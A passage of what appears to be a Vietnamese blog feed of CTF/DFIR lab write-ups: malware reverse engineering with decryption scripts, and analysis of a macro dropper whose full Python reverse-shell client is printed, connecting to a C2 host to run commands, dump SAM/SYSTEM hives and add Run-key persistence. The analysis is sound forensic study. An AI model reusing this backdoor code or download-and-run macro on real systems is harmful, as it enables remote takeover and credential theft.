&lt;pre&gt;&lt;code&gt;mov qword ptr ss:[rsp+10h] ,rbx 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cấp quyền Write cho phân vùng này của kernel32 để sử dụng WriteFile/ReadFile ghi dữ liệu
&lt;img src=&quot;https://hackmd.io/_uploads/B1GLmqR8lx.png&quot; alt=&quot;image&quot; /&gt;
ER-- to ERW--
Tại offset&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov qword ptr ss:[rsp+20], r9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cấp quyền cho phân vùng r9
&lt;img src=&quot;https://hackmd.io/_uploads/SyJy4qRLxg.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1Sb450Uxe.png&quot; alt=&quot;image&quot; /&gt;
của .text file shel2.exe cho phép đọc và ghi dữ liệu
Do không có quyền truy cập vùng nhớ file và tôi phải patch nên dữ liệu đọc được sẽ là giá trị rác
&lt;img src=&quot;https://hackmd.io/_uploads/BJ2erqRLgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;đặt breakpoint ở offset = 00007FF6214B1145
Fix lại giá trị rác của [rsp+161]&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FF FE 78 00 47 00 6B 00 -&amp;gt; xGk89_Ew
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vì thế đến đoạn xử lý [rsp+161] được coi là buffer of File tôi sẽ điền value file ở đó
và tiếp tục xor để lấy flag
&lt;img src=&quot;https://hackmd.io/_uploads/SkTrrqA8xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;PS: Bài này mình thấy khá là nặng về Obfuscation và Reverse Engineering nếu như intend solution không cần phải guessy&lt;/p&gt;
</content:encoded></item><item><title>TheSaintManBat</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/thesaintmanbat/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/thesaintmanbat/</guid><pubDate>Fri, 20 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;The Saint Bat&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Difficulty: Medium
https://github.com/Azr43lKn1ght/DFIR-LABS/tree/main/The%20Saint%20Bat
Description
The Saint Batman Azrael was sent a confidential file by a secret agent but it was a stealthy malware that made him lose what he was holding. The malware seems to be very sophisticated and the Saint Bat needs your help to recover the lost data of bane&apos;s whereabouts to get back at bane for breaking batman&apos;s back. well help him get it!
Note: This challenge doesn&apos;t have any questions but the flag itself!
File Password : vOCorthoAGESeNsivEli&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Kiểm tra process list và file scan ta tiến hành dump file confidential.exe có dấu hiệu ra
&lt;img src=&quot;https://hackmd.io/_uploads/SkxpqhXNxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;└[ mnt »  »  » Memchall ]
❯ file confidential.exe
confidential.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;check signature file đây là một file PE32+
&lt;img src=&quot;https://hackmd.io/_uploads/S1YSohQNlx.png&quot; alt=&quot;image&quot; /&gt;
check file với IDA tiến hành static analysis&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H18AjnmVle.png&quot; alt=&quot;image&quot; /&gt;
Ta thấy hàm sub_140002D50 có vẻ rất ấn tượng&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkbM62QExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Trong hàm chứ 1 anti debug and một AddVectoredExceptionHandler theo logic code thì attacker sẽ gây ra exception để đưa chương trình tới trình Handler xử lý main logic&lt;/p&gt;
&lt;p&gt;Handler -&amp;gt; (DWORD64)sub_1400020F0 đây là hàm chứa logic chính&lt;/p&gt;
&lt;h2&gt;Tại sub_1400020F0&lt;/h2&gt;
&lt;p&gt;Ta lấy chương trình sẽ load một Resource trong chính nó có ID 0x45 -&amp;gt; 69 và Name là STUB sau đo sẽ decrypt malicious code với RC4 PKGA
nhưng key có vẻ đã bị obfuscation để làm cho khó phân tích tĩnh nên tôi đã debugging để lấy key
Sau khi decrypted(unpacked) nó được load vào explorer.exe if 32bit thì folder path : C:\Windows\SysWOW64\explorer.exe, còn nếu 64bit thì C:\Windows\explorer.exe sau
nó sẽ chạy file bằng CreateProcessA&lt;/p&gt;
&lt;p&gt;Mục tiêu debug là bypass anti debug và pass Exception đặt break tại handler và sub_1400020F0
&lt;img src=&quot;https://hackmd.io/_uploads/rJe-4amVee.png&quot; alt=&quot;image&quot; /&gt;
Tại đây tôi sẽ skip để bypass anti debug
&lt;img src=&quot;https://hackmd.io/_uploads/B1Q44TXNlg.png&quot; alt=&quot;image&quot; /&gt;
Tại đây gây ra exception với lệnh call Sleep Tại sao lại xảy ra Exception?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Using VirtualProtect with PAGE_GUARD and Sleep can trigger an access violation exception when the protected memory is accessed, even if the access is not directly from the code that called VirtualProtect. This occurs because the OS handles the exception generated by the guard page, and the Sleep call can indirectly cause this access. 
Here&apos;s a breakdown:
1. VirtualProtect and PAGE_GUARD:
VirtualProtect with the PAGE_GUARD flag modifies the protection attributes of a memory page. When the page is accessed (read or written), a STATUS_GUARD_PAGE_VIOLATION exception is raised. 
2. Implicit Access:
The Sleep function itself doesn&apos;t directly cause the exception. However, when a thread is in a waiting state, the OS might need to access the thread&apos;s stack or other data structures to manage the waiting state. If this access involves a page protected by PAGE_GUARD, the exception will be triggered. 
3. Exception Handling:
The exception is handled by the operating system, and if a handler is registered (e.g., using AddVectoredExceptionHandler), the handler function can then execute. 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;và được xử lý để nhảy vào hàm sub_1400020F0
&lt;img src=&quot;https://hackmd.io/_uploads/ryOoVT7Nle.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Sk_nBpQExg.png&quot; alt=&quot;image&quot; /&gt;
Tại đây v15 lưu một đỉa chỉ stack chứa key&lt;/p&gt;
&lt;h3&gt;key : }zr#llKn]gh~_hides_the_key?idk&lt;/h3&gt;
&lt;h2&gt;Decrypt STUB&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJLzUamExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Sau khi lấy key và decrypt thi ta tiến hành reverse file STUB&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HANDLE FileW; // esi
  DWORD FileSize; // eax
  DWORD v6; // ebx
  int v7; // eax
  int v8; // eax
  bool v9; // cf
  HANDLE v10; // esi
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-850h] BYREF
  _BYTE Buffer[2048]; // [esp+10h] [ebp-84Ch] BYREF
  WCHAR FileName[2]; // [esp+810h] [ebp-4Ch] BYREF
  wchar_t **v15; // [esp+820h] [ebp-3Ch]
  int v16; // [esp+824h] [ebp-38h]
  int v17; // [esp+828h] [ebp-34h]
  int v18; // [esp+82Ch] [ebp-30h]
  int v19; // [esp+830h] [ebp-2Ch]
  int v20; // [esp+834h] [ebp-28h]
  int v21; // [esp+838h] [ebp-24h]
  int v22; // [esp+83Ch] [ebp-20h]
  int v23; // [esp+840h] [ebp-1Ch]
  int v24; // [esp+844h] [ebp-18h]
  int v25; // [esp+848h] [ebp-14h]
  int v26; // [esp+84Ch] [ebp-10h]
  int v27; // [esp+850h] [ebp-Ch]
  __int16 v28; // [esp+854h] [ebp-8h]

  wmemcpy(FileName, L&quot;C:\\Users&quot;, 8);
  v28 = 0;
  v15 = &amp;amp;off_41005C;
  v16 = 7471226;
  v17 = 3342388;
  v18 = 6029420;
  v19 = 7274564;
  v20 = 7209079;
  v21 = 7274604;
  v22 = 6553697;
  v23 = 6029427;
  v24 = 3604582;
  v25 = 6750305;
  v26 = 7602222;
  v27 = 7602296;
  FileW = CreateFileW(FileName, 0x80000000, 3u, 0, 3u, 0, 0);
  NumberOfBytesRead = 0;
  FileSize = GetFileSize(FileW, 0);
  v6 = FileSize + 32;
  v7 = ((_BYTE)FileSize + 32) &amp;amp; 0xF;
  if ( v7 )
    v6 += 16 - v7;
  v8 = 0;
  v9 = 1;
  do
  {
    if ( !v9 )
      __report_rangecheckfailure();
    Buffer[v8++] = 0;
    v9 = (unsigned int)v8 &amp;lt; 0x800;
  }
  while ( v8 &amp;lt; 2048 );
  ReadFile(FileW, Buffer, v6, &amp;amp;NumberOfBytesRead, 0);
  CryptProtectMemory(Buffer, v6, 0);
  CloseHandle(FileW);
  v10 = CreateFileW(FileName, 0x40000000u, 2u, 0, 3u, 0, 0);
  WriteFile(v10, Buffer, v6, &amp;amp;NumberOfBytesRead, 0);
  CloseHandle(v10);
  MessageBoxA(0, &quot;Warning: Error code 42069&quot;, &quot;Security Warning&quot;, 0x30u);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Main code&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Đọc file đường dẫn : C:\Users&amp;lt;username&amp;gt;\Downloads\f7ag.txt&lt;/li&gt;
&lt;li&gt;say đó sử dụng CryptProctecMemory để mã hóa dữ liệu trong memory&lt;/li&gt;
&lt;li&gt;Để decrypt ta phải có được g_SHAhash và g_RandomSalt và Cookie, CreateTime&lt;/li&gt;
&lt;li&gt;Trong đó g_SHAhash,Cookie,CreateTime sẽ dùng tạo key và g_RanDomSalt là IV&lt;/li&gt;
&lt;li&gt;vì sao nó sử dụng AES mà không phải 3DES
&lt;img src=&quot;https://hackmd.io/_uploads/ByW3eTX4ex.png&quot; alt=&quot;image&quot; /&gt;
Tại đây mỗi block là 16 cho AES128 và 3DES mỗi block là 8
https://blog.slowerzs.net/posts/cryptdecryptmemory/
đây là blog bạn có thể tham khảo về decrypt CryptProctectMemory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Kernel Debug WinDBG&lt;/h2&gt;
&lt;p&gt;để thuận tiện tôi sẽ sử dụng WinDBG để debug kernels và load các symbols
&lt;img src=&quot;https://hackmd.io/_uploads/rkzkz6QNll.png&quot; alt=&quot;image&quot; /&gt;
đây là các thông tin ta cần&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from Crypto.Cipher import AES
from Crypto.Hash import SHA1
import struct



# === INPUT FROM MEMORY DUMP ===
g_sha = bytes.fromhex(&quot;d4 63 5e c5 ba 9c 00 f0 67 b4 57 b3 d7 03 3f 93 1c 14 51 fa b4 4f ec 30&quot;)
cookie = 0xbc1c6a1a
createtime =  0x01db69dc687cacd6
salt = bytes.fromhex(&quot;75 54 c7 57 94 18 f0 54 17 0f 4c 3c cd 56 b0 e3&quot;)  # IV

# === READ ENCRYPTED DATA ===
with open(&quot;f7ag.txt&quot;, &quot;rb&quot;) as f:
    enc = f.read()

# === AES128 CBC DECRYPTION ===
ctx = SHA1.new()
ctx.update(g_sha)
ctx.update(struct.pack(&quot;&amp;lt;LQ&quot;, cookie, createtime))
aes_key = ctx.digest()[:16]

cipher = AES.new(aes_key, AES.MODE_CBC, iv=salt)
dec = cipher.decrypt(enc)
print(f&quot;key : {aes_key.hex()}&quot;)
print(f&quot;iv: {salt.hex()}&quot;)


Output:
PS D:\CTFchall\Memchall&amp;gt; python .\key.py
key : faa8db02422c737fce649f4f09169ec3
iv: 7554c7579418f054170f4c3ccd56b0e3

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1O0G6QVgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;PS: Nếu các bạn có thắc mắc gì có thể inbox cho mình&lt;/p&gt;
</content:encoded></item><item><title>The Malware Crusade (DFIR Labs Series)</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/malwarecursada/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/malwarecursada/</guid><pubDate>Fri, 20 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;The Malware Crusade&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Medium on DFIR labs
Description
I downloaded a phishy word document from my mail, little did I know it was gonna bite me back. Right after I downloaded the file my computer went haywire and all my files where encrypted. There is an important file among it. Can you figure out what all happened and also recover my files back ?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;File Password : L1&amp;gt;l:p7!7h4[D23^iZ&amp;amp;)&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Questions&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;Q1) What is the value of the registry entry that was stored by the macro?

Q2) What is the first command that was sent to C2 victim from the C2 server?

Q3) What is the key used by the ransomware to encrypt the zip file? key used by the ransomware?

Q4) What is the md5 hash of the important document that he had compressed and stored {md5(file)}?

Q5) The can you find out where the user stores his secrests online

Q6) The user noted down the password to unlock private secret storage and forgot to save it can you recover it ?

Q7) What is inside the private secret storage ?
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Question1&lt;/h2&gt;
&lt;p&gt;Tôi sử dụng công cụ oletools để extraction ra các macro chứa trong file cv_001.dotm
&lt;img src=&quot;https://hackmd.io/_uploads/SJ5HjPMNex.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1sLowMExx.png&quot; alt=&quot;image&quot; /&gt;
Trong macro có các Function&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sub AutoOpen() chức năng tự động chạy DownloadAndOpenFile và RegistryEntry&lt;/li&gt;
&lt;li&gt;Sub Document_Open() Chức năng khi document được mở sẽ chạy  DownloadAndOpenFile và RegistryEntry&lt;/li&gt;
&lt;li&gt;Sub RegistryEntry() Chức năng tạo một key reg và lạm dụng Wscript.Shell để thêm registry&lt;/li&gt;
&lt;li&gt;Sub DownloadAndOpenFile()
download một file từ url&lt;br /&gt;
url = &quot;https://filebin.net/d4oxliqap0dxa52y/client.py&quot;
destinationPath = Environ(&quot;TEMP&quot;) &amp;amp; &quot;\msserver.py&quot;
sau đó chạy file với WSCRIPT.SHELL()
python.exe &amp;amp; &quot; &quot; &amp;amp; &apos; &amp;amp; DestinationPath &apos;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Answer 1 : keyValue = &quot;fA3bDt&quot;&lt;/h3&gt;
&lt;p&gt;Kiểm tra và lấy file trong folder path : C:\Users\challenge\AppData\Local\Temp\msserver.py
&lt;img src=&quot;https://hackmd.io/_uploads/SkUU2PGNgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import json
import os
import shutil
import socket
import subprocess
import sys
import time
from sys import platform
import requests
import base64


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = &quot;&quot;
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, &quot;wb&quot;)
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, &quot;rb&quot;)
    s.send(f.read())
    f.close()


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split(&quot;/&quot;)[-1]
    with open(file_name, &quot;wb&quot;) as out_file:
        out_file.write(get_response.content)


def get_sam_dump():
    if not is_admin():
        return &quot;You must run this function as an Administrator.&quot;

    SAM = r&quot;C:\\Windows\\System32\\config\\SAM&quot;
    SYSTEM = r&quot;C:\\Windows\\System32\\config\\SYSTEM&quot;
    SECURITY = r&quot;C:\\Windows\\System32\\config\\SECURITY&quot;

    try:
        sam_file = open(SAM, &quot;rb&quot;)
        system_file = open(SYSTEM, &quot;rb&quot;)
        security_file = open(SECURITY, &quot;rb&quot;)

        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()

        sam_file.close()
        system_file.close()
        security_file.close()

        return sam_data, system_data, security_data
    except PermissionError:
        return &quot;Insufficient permissions to access SAM, SYSTEM, or SECURITY files.&quot;
    except FileNotFoundError:
        return &quot;SAM, SYSTEM, or SECURITY file not found. Please check the file paths.&quot;
    except Exception as e:
        return f&quot;An unexpected error occurred: {str(e)}&quot;


def persist(reg_name, copy_name):
    file_location = os.environ[&quot;appdata&quot;] + &quot;\\&quot; + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                &quot;reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;
                + reg_name
                + &apos; /t REG_SZ /d &quot;&apos;
                + file_location
                + &apos;&quot;&apos;,
                shell=True,
            )
            reliable_send(&quot;[+] Created Persistence With Reg Key: &quot; + reg_name)
        else:
            reliable_send(&quot;[+] Persistence Already Exists&quot;)
    except:
        reliable_send(&quot;[-] Error Creating Persistence With The Target Machine&quot;)


def startup_persist(file_name):
    pass


def is_admin():
    global admin
    if platform == &quot;win32&quot;:
        try:
            temp = os.listdir(
                os.sep.join([os.environ.get(&quot;SystemRoot&quot;, &quot;C:\\windows&quot;), &quot;temp&quot;])
            )
        except:
            admin = &quot;[!!] User Privileges!&quot;
        else:
            admin = &quot;[+] Administrator Privileges!&quot;
    elif platform == &quot;linux&quot; or platform == &quot;linux2&quot; or platform == &quot;darwin&quot;:
        pass


def highly_secure_payload(data, flag):
    if flag:
        data = bytearray(data.encode())
        for i in range(len(data)):
            data[i] = data[i] ^ i
        data = base64.b64encode(data).decode()
    else:
        data = bytearray(base64.b64decode(data))
        for i in range(len(data)):
            data[i] = data[i] ^ i
        data = data.decode()
    return data


def shell():
    while True:
        command = reliable_recv()
        command = highly_secure_payload(command, 0)
        if command == &quot;quit&quot;:
            break
        elif command == &quot;background&quot; or command == &quot;bg&quot;:
            pass
        elif command == &quot;help&quot;:
            pass
        elif command == &quot;clear&quot;:
            pass
        elif command[:3] == &quot;cd &quot;:
            os.chdir(command[3:])
        elif command[:6] == &quot;upload&quot;:
            download_file(command[7:])
        elif command[:8] == &quot;download&quot;:
            upload_file(command[9:])
        elif command[:3] == &quot;get&quot;:
            try:
                download_url(command[4:])
                reliable_send(&quot;[+] Downloaded File From Specified URL!&quot;)
            except:
                reliable_send(&quot;[!!] Download Failed!&quot;)
        elif command[:11] == &quot;persistence&quot;:
            reg_name, copy_name = command[12:].split(&quot; &quot;)
            persist(reg_name, copy_name)
        elif command[:7] == &quot;sendall&quot;:
            subprocess.Popen(
                command[8:],
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
        elif command[:5] == &quot;check&quot;:
            try:
                is_admin()
                reliable_send(admin + &quot; platform: &quot; + platform)
            except:
                reliable_send(&quot;Cannot Perform Privilege Check! Platform: &quot; + platform)
        elif command[:5] == &quot;start&quot;:
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send(&quot;[+] Started!&quot;)
            except:
                reliable_send(&quot;[-] Failed to start!&quot;)

        elif command[:12] == &quot;get_sam_dump&quot;:
            sam_dump, system_dump, security_dump = get_sam_dump()
            reliable_send((sam_dump, system_dump, security_dump))
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            result = highly_secure_payload(result, 1)
            reliable_send(result)


def connection():
    while True:
        time.sleep(1)
        try:
            s.connect((&quot;192.168.56.1&quot;, 5555))

            shell()
            s.close()
            break
        except:
            connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tóm tắt script&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;connection()  tạo một socket C2&lt;/li&gt;
&lt;li&gt;reliable_send(data): Gửi data&lt;/li&gt;
&lt;li&gt;reliable_recv() : Nhận data và Deseralization data&lt;/li&gt;
&lt;li&gt;download_file(file_name):&lt;/li&gt;
&lt;li&gt;upload_file(file_name):&lt;/li&gt;
&lt;li&gt;download_url()&lt;/li&gt;
&lt;li&gt;get_sam_dump() : đọc các credentials trong SAM và SYSTEM hive&lt;/li&gt;
&lt;li&gt;highly_secure_payload(data, flag) : Nếu có flag thì encode base64 và ^ i
Nếu không có flag thì decode base64 và decrypt XOR&lt;/li&gt;
&lt;li&gt;persist(reg_name, copy_name) add file vào CurrentVersion\RUN&lt;/li&gt;
&lt;li&gt;is_admin(): check admin priviledge&lt;/li&gt;
&lt;li&gt;shell(): Control handler&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Từ script ta lọc wireshark với ip.addr == 192.168.56.1 &amp;amp;&amp;amp; tcp.port == 5555&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1wh1_fExx.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJvpJuMNxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;script decrypt.py&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import base64
enc = [&quot;d2ltYmls&quot;, &quot;Y2ljb2hZZW9pZWZuYmprAho=&quot;, &quot;ZWJqbCRpT2RYQE1MVG54&quot;, &quot;bEhhU01CQV9rfwcB&quot;, &quot;ZWJqbCRkUTZ/azlBPERGRXhzf0Fid0Vgf3spVm9UVlEReExhXUcUaURKGWZfZGZhAFJfX0FvT0BfXQhXSV5TaS4CJX55ZXh5aC8jJyljOjck&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQEJBYFRZXXZyf0V6dE5ZKHp0d3p5c1lTRXV2S0QUcR1laWlWSXllQmtqWEd8fm1QW3JtUGUMCigjFRY0CiEodWl0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRMRUZvQEJZdWhaYFsxLC00c397fTduY2g=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWlLRXdkdiVFYXxMIm5HRnRHcXFhF0RxElFzfUhZeR1tXFNZR1hQZV9KY2JQT3R2cXEYLzcoIBUsA2l0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSJIRWslT0Vgf0FjWiVUVntQQ0xpSH9fEnpNfX1VSHh1WFN6ZVhnblBXWldtUlxmcXAiLC8iJHQRfQUJCX4UGTdhCwRqIQwBZjQSCzRhfWBhQAcLDwFLEh8c&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSNwRSZtT0F0bUgoY2p+LElse3pIS0ZLcUZIcmUcTkBDVlAAZQF+Z1gFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWlLSkEldnsjf313XW95SUprARwdBENPS00HXlNY&quot;,  &quot;ZWJqbCRMRUZvQE1dOFQ8WWd1VnxfNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWdISl1uVnEqJTkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkNFE9QE47a2k8Y2Vyf0V6WX1/VEtMd3pML0lzdEl1a3NgHn58Gn1/bkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRmNVFhaDhdOURKP3dye1lAdyRNKH0oXWVHSGd2Q09PUUYVdUBLbVxFbkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRha0F7bV1dam9jSWRLQVItXFVdWnpSWW98SVFIRWVPUkdPbmMJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRha0F7bV1ea11dTWlLRVV/TSVddEMod2Z5VlUVeRF5TEducURibV9ASH1YV1IBZV1UBGENdXl5DmRpR3EbFHoxHBF2JAIbJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkNFE9QE47a2ljSWN1RUZfNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5+QE47a0ZPYC0xLC00c397fTduY2g=&quot;,  &quot;ZWJqbCRMRUZvQEx/fERJVWZye1FkXFF7bVBSVSx+c3NVe1sWTEYUaVhIfBJfTx1LXFJffVxWBGFcel0GAR0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQEl4a1o8ZHdLfyptXFF8f3hNL3t+LU1ZQHUWSmlLYVJwGEdcdR15R1J1ZU1sBHFCY2wLdx0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQEl4a1o8ZHdLfyptXFF8f3hNL3t+LU1ZQHUWSmlLdVhzGEccTh8fexEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCROV2g1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5xQE1ga2xZO3dyf1VhTyRCd1dZcCpeeSIdARwdBENPS00HXlNY&quot;,  &quot;ZWJqbCRMRUZvQE1/YGhdTmJBQVFtTEEic3soK2lELHdWQHVtSG5hfV5LU0BnDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1/YGhYQXpwVUJ7dCRBLVJOdFc9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQEJFZmxJWXtYViNzQiR8f0N3ImVUWXRHQHUXQ0ZLYV1zGH5DYG1YV3xYZgZ+YAdzGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQE1ga11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTWFYVX9hXF5dcHt3f3BWWl5TaGZqFWtPTB5qTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWBYViNzXlF8f1JjWWZELHdMe2RXVX11ZlpgbV9ASHhbQXhxZlNXcWFNcn1PUFhtUyQKEQIoDAIOeQctJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBzSlJzRUVVYkAoc3BHWGtReXNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaUFJWiVUVlFKQGV1T3IUS0xqTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaEFJWiVUVk1UQmNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJBYGlGWWlze1FuTCR/dENbdCE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1vYG9iQSByf0V8d0V/YkAoc3BHXXQWYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1ga11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQE1ka11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQEJvY2xZd3xYVEFtcUFCLlp9JiE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWBYViNzXlJSf1JjWWxWTV5MaGZqFWtBSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWFYViNzXl5ZcnhdTXdKLHNEaGFQQ0RPTE9jeWpVY3p2exEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBzSlJzRUVVYkAoc3BHWGtReXNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaUFJWiVUVlFKQGV1T3IUS0xqTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaEFJWiVUVk1UQmNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSVwRUVnT1VVYkAoc3BHWGxPQhBtS39xdUpIfBtLZldtSmgAW1hvcENJYWlQW3dtfjkPFhkgBiF6dWl0dWwrJyM1fyYrIA==&quot;,  